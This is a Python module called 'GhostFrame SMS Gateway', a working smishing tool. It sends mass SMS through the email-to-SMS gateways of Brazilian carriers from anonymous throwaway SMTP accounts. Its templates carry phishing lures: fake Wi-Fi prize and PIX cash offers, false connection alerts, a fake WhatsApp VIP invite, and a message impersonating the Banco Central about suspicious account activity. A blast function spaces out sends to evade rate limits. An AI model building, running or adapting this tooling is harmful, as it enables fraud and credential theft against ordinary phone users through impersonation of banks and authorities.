"""
GhostFrame SMS Gateway — email-to-SMS via operadoras brasileiras
Envio anônimo via SMTP (ProtonMail/Gmail descartável)
"""
import smtplib
import json
import time
import threading
from email.mime.text import MIMEText
from datetime import datetime

# ═══ CONFIG ═══
SMTP_CONFIG = {
    "host": "smtp.gmail.com",
    "port": 587,
    "user": "SEU_EMAIL_DESC@proton.me",
    "pass": "SUA_SENHA_APP",
    "from_name": "Wi-Fi Test"
}

# Gateways email→SMS por operadora
GATEWAYS = {
    "vivo":       "{numero}@torpedo.com.br",
    "claro":      "{numero}@clarotorpedo.com.br",
    "oi":         "{numero}@oi.com.br",
    "tim":        "{numero}@tim.com.br",
    "nextel":     "{numero}@nextel.com.br",
    "sercomtel":  "{numero}@sercomtel.com.br",
}

# Templates de SMS — não inclua links reais, use placeholder
TEMPLATES = {
    "wifi_test": (
        "Seu teste de conexao Wi-Fi esta pronto! "
        "Veja o resultado e concorra a R$1000 no PIX: {link}"
    ),
    "prize": (
        "Parabens! Voce foi sorteado no Wi-Fi Speed Test. "
        "Resgate seu premio em: {link}"
    ),
    "urgent": (
        "ALERTA: Sua conexao esta instavel. "
        "Execute o diagnostico agora: {link}"
    ),
    "whatsapp_vip": (
        "Voce foi convidado para o grupo VIP de Promocoes! "
        "Confirme sua vaga: {link}"
    ),
    "bank": (
        "Banco Central: Atividade suspeita detectada na sua conta. "
        "Verifique imediatamente: {link}"
    ),
}

# Log de envios
sms_log = []
_sms_log_lock = threading.Lock()


def send_sms(numero, template_name, link=None, operadora="vivo"):
    """
    Envia SMS via email-to-SMS gateway.

    Args:
        numero: DDD+NUMERO sem formatação (ex: 11999998888)
        template_name: chave do TEMPLATES
        link: URL a incluir (ex: https://toobscuro.github.io/new)
        operadora: vivo|claro|oi|tim|nextel|sercomtel

    Returns:
        dict com status e detalhes
    """
    if operadora not in GATEWAYS:
        return {"ok": False, "error": f"Operadora inválida: {operadora}"}

    gateway = GATEWAYS[operadora]
    to_addr = gateway.format(numero=numero)

    template = TEMPLATES.get(template_name, TEMPLATES["wifi_test"])
    body = template.format(link=link or "http://exemplo.com")

    msg = MIMEText(body, "plain", "utf-8")
    msg["From"] = f'{SMTP_CONFIG["from_name"]} <{SMTP_CONFIG["user"]}>'
    msg["To"] = to_addr
    msg["Subject"] = ""
    msg["X-Priority"] = "1"

    try:
        server = smtplib.SMTP(SMTP_CONFIG["host"], SMTP_CONFIG["port"], timeout=15)
        server.starttls()
        server.login(SMTP_CONFIG["user"], SMTP_CONFIG["pass"])
        server.sendmail(SMTP_CONFIG["user"], [to_addr], msg.as_string())
        server.quit()

        result = {
            "ok": True,
            "numero": numero,
            "operadora": operadora,
            "template": template_name,
            "to": to_addr,
            "link": link,
            "timestamp": datetime.now().isoformat(),
            "body": body[:160]
        }

        with _sms_log_lock:
            sms_log.append(result)

        return result

    except Exception as e:
        result = {
            "ok": False,
            "numero": numero,
            "operadora": operadora,
            "template": template_name,
            "error": str(e),
            "timestamp": datetime.now().isoformat()
        }
        with _sms_log_lock:
            sms_log.append(result)
        return result


def send_blast(numeros, template_name, link=None, operadora="vivo", delay=3):
    """
    Envia SMS em massa com delay entre envios (anti-rate-limit).
    Roda em thread separada.
    """
    results = []
    for numero in numeros:
        r = send_sms(numero, template_name, link, operadora)
        results.append(r)
        time.sleep(delay)
    return results


def get_sms_log(limit=50):
    with _sms_log_lock:
        return list(sms_log[-limit:])


def get_operadoras():
    return list(GATEWAYS.keys())


def get_templates():
    return list(TEMPLATES.keys())


def configure_smtp(host, port, user, password, from_name="Wi-Fi Test"):
    SMTP_CONFIG.update({
        "host": host,
        "port": int(port),
        "user": user,
        "pass": password,
        "from_name": from_name
    })
    return {"ok": True, "host": host, "user": user}


def test_smtp():
    """Testa a conexão SMTP — retorna True se conectou e autenticou"""
    try:
        server = smtplib.SMTP(SMTP_CONFIG["host"], SMTP_CONFIG["port"], timeout=10)
        server.starttls()
        server.login(SMTP_CONFIG["user"], SMTP_CONFIG["pass"])
        server.quit()
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)}
